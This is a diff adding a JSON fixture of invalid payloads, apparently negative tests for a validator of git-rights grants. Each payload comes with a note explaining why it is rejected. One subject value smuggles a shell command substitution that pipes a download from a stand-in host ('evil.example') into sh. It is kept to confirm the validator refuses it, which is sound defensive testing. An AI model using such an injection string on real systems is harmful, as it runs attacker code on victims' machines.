@@ -1,0 +1,92 @@
+[
+  {
+    "note": "`right` is one of the five git rights, spelled as the TRQP action.",
+    "payload": {
+      "subject": "did:webvh:QmBobScid2:acme-vtc.example:bob",
+      "right": "admin",
+      "resource": "github.com/acme"
+    }
+  },
+  {
+    "note": "A resource always names its forge. `acme/widgets` alone could be GitHub's or Codeberg's.",
+    "payload": {
+      "subject": "did:webvh:QmBobScid2:acme-vtc.example:bob",
+      "right": "git.commit.sign",
+      "resource": "acme/widgets"
+    }
+  },
+  {
+    "note": "Resources are lowercase; the registry compares them by exact string.",
+    "payload": {
+      "subject": "did:webvh:QmBobScid2:acme-vtc.example:bob",
+      "right": "git.commit.sign",
+      "resource": "github.com/Acme/Widgets"
+    }
+  },
+  {
+    "note": "A resource is a host plus an owner and at most a repository, with no scheme.",
+    "payload": {
+      "subject": "did:webvh:QmBobScid2:acme-vtc.example:bob",
+      "right": "git.commit.sign",
+      "resource": "https://github.com/acme/widgets"
+    }
+  },
+  {
+    "note": "`subject` is a DID, not a forge login.",
+    "payload": {
+      "subject": "bob",
+      "right": "git.commit.sign",
+      "resource": "github.com/acme/widgets"
+    }
+  },
+  {
+    "note": "`expiresAt` is an RFC 3339 date-time, not a duration.",
+    "payload": {
+      "subject": "did:webvh:QmBobScid2:acme-vtc.example:bob",
+      "right": "git.commit.sign",
+      "resource": "github.com/acme/widgets",
+      "expiresAt": "P90D"
+    }
+  },
+  {
+    "note": "Unknown members are refused (additionalProperties: false).",
+    "payload": {
+      "subject": "did:webvh:QmBobScid2:acme-vtc.example:bob",
+      "right": "git.commit.sign",
+      "resource": "github.com/acme/widgets",
+      "grantedBy": "did:webvh:QmAliceScid1:acme-vtc.example:alice"
+    }
+  },
+  {
+    "note": "`subject` is a DID in the W3C DID Core syntax, whose method-specific id admits only `A-Z a-z 0-9 . - _ :` and percent-encoded octets. `did:[a-z0-9]+:\\S+` let a command substitution through, and a surface that later quoted the value into a shell command ran it.",
+    "payload": {
+      "subject": "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)",
+      "right": "git.commit.sign",
+      "resource": "github.com/acme/widgets"
+    }
+  },
+  {
+    "note": "`subject` is a DID, and a DID has no whitespace in it.",
+    "payload": {
+      "subject": "did:web:acme-vtc.example:bob evil",
+      "right": "git.commit.sign",
+      "resource": "github.com/acme/widgets"
+    }
+  },
+  {
+    "note": "`subject` is a bare DID naming a party, not a DID URL: a `#` fragment (a verification-method id) is refused, as are a path and a query.",
+    "payload": {
+      "subject": "did:key:z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK#z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK",
+      "right": "git.commit.sign",
+      "resource": "github.com/acme/widgets"
+    }
+  },
+  {
+    "note": "`subject` is a DID, whose method name is lowercase letters and digits only; `did:WebVH:` is not `did:webvh:`, and DIDs are compared by exact string.",
+    "payload": {
+      "subject": "did:WebVH:QmBobScid2:acme-vtc.example:bob",
+      "right": "git.commit.sign",
+      "resource": "github.com/acme/widgets"
+    }
+  }
+]
